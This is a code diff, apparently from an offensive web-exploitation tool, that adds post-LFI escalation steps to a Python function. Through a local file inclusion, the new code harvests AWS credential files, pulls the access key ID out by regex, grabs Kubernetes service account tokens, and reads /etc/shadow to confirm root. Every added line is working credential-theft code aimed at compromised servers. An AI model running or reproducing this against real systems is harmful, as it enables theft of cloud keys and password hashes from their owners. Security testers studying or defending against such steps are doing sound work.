@@ -13998,4 +13998,43 @@ def escalate_post_lfi(
     except Exception:
         pass
 
+    # 10. AWS credentials file (~/.aws/credentials)
+    for _aws_path in ("/root/.aws/credentials", "/var/www/.aws/credentials",
+                      "/home/ubuntu/.aws/credentials", "/home/ec2-user/.aws/credentials"):
+        try:
+            _awscreds = request_fn(_aws_path)
+            if _awscreds and ("aws_access_key_id" in _awscreds.lower() or
+                              "aws_secret_access_key" in _awscreds.lower()):
+                _aws_key = re.search(r"aws_access_key_id\s*=\s*([A-Z0-9]{16,20})", _awscreds, re.I)
+                result["aws_credentials_found"] = _aws_path
+                result["aws_key_id"] = _aws_key.group(1) if _aws_key else "(found)"
+                result["escalation_level"] = "log_poison_rce"
+                step(f"  post-lfi: AWS credentials en {_aws_path!r} — key_id={result['aws_key_id']}")
+                break
+        except Exception:
+            pass
+
+    # 11. GCP service account token / metadata
+    for _gcp_path in ("/run/secrets/token", "/var/run/secrets/kubernetes.io/serviceaccount/token"):
+        try:
+            _gcp = request_fn(_gcp_path)
+            if _gcp and len(_gcp) > 50 and "." in _gcp[:300]:  # JWT-like token
+                result["k8s_service_account_token_found"] = _gcp_path
+                result["k8s_sa_token_preview"] = _gcp[:60] + "..."
+                result["escalation_level"] = "log_poison_rce"
+                step(f"  post-lfi: K8s service account token en {_gcp_path!r}")
+                break
+        except Exception:
+            pass
+
+    # 12. /etc/shadow — readable only if running as root (confirms privilege)
+    try:
+        _shadow = request_fn("/etc/shadow")
+        if _shadow and re.search(r"root:\$[16y]\$", _shadow):
+            result["etc_shadow_readable"] = True
+            result["escalation_level"] = "log_poison_rce"
+            step("  post-lfi: /etc/shadow LEIDO — proceso corre como root")
+    except Exception:
+        pass
+
     return result
